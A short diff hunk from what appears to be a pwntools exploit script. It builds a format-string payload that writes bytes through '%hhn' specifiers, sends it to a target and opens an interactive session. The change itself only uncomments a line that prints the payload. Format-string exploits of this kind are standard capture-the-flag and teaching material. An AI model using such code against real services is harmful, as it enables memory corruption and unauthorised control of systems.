@@ -32,7 +32,7 @@ for i in range(4):
     offset = (x - cnt) % 256
     buf += "%{0}c%{1}$hhn".format(offset, pos + i)
     cnt += offset
-#print(buf)
+print(buf)
 r.sendline(buf)
 r.interactive()
 
